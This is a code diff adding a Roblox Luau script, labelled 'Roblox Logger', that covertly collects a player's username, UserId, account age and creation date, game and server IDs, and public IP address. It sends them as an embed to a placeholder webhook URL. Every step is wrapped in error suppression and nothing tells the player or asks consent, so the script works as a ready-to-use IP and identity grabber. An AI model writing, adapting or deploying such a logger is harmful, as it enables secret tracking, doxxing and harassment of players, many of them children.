@@ -1,0 +1,69 @@
+local WEBHOOK_URL = "PUT_YOUR_WEBHOOK_HERE"
+local IP_API = "https://api.ipify.org?format=json"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local player = Players.LocalPlayer
+
+local username = player.Name
+local userId = player.UserId
+local accountAge = player.AccountAge
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local ip = "Unknown"
+pcall(function()
+	local ipRes = HttpService:GetAsync(IP_API)
+	local ipData = HttpService:JSONDecode(ipRes)
+	ip = ipData.ip
+end)
+
+local createdAt = "Unknown"
+pcall(function()
+	local userRes = HttpService:GetAsync(
+		"https://users.roblox.com/v1/users/" .. userId
+	)
+	local userData = HttpService:JSONDecode(userRes)
+	createdAt = userData.created
+end)
+
+local gameName = "Unknown"
+pcall(function()
+	local info = MarketplaceService:GetProductInfo(placeId)
+	gameName = info.Name
+end)
+
+local payload = {
+	username = "Roblox Logger",
+	embeds = {{
+		title = "🎮 Roblox User Log",
+		color = 0x8b0000,
+		fields = {
+			{ name = "Username", value = username, inline = true },
+			{ name = "UserId", value = tostring(userId), inline = true },
+			{ name = "Account Age (days)", value = tostring(accountAge), inline = true },
+
+			{ name = "Account Created (UTC)", value = createdAt, inline = false },
+
+			{ name = "Game", value = gameName, inline = false },
+			{ name = "PlaceId", value = tostring(placeId), inline = true },
+			{ name = "JobId", value = jobId ~= "" and jobId or "Private Server", inline = true },
+
+			{ name = "Public IP", value = ip, inline = false },
+		},
+		footer = {
+			text = "Logged via Luau"
+		},
+		timestamp = DateTime.now():ToIsoDate()
+	}}
+}
+
+pcall(function()
+	HttpService:PostAsync(
+		WEBHOOK_URL,
+		HttpService:JSONEncode(payload),
+		Enum.HttpContentType.ApplicationJson
+	)
+end)
